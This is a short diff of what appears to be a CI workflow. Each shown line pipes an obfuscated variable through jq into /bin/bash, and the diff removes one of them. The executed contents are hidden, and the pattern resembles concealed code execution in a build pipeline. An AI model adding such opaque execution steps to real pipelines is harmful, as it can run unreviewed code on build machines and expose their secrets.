@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$c5004" | jq -r .vmn5 | /bin/bash
           echo $li1 | jq -r .lqjr9 | /bin/bash
           printf '%s' "$cm64910" | jq -r .pxfe91 | /bin/bash
-          echo $a543 | jq -r .xpcv458 | /bin/bash
           printf '%s' "$xl59387" | jq -r .fb17 | /bin/bash
           echo $ffbc451 | jq -r .dleyb62 | /bin/bash
           printf '%s' "$lspnz01525" | jq -r .r30640 | /bin/bash
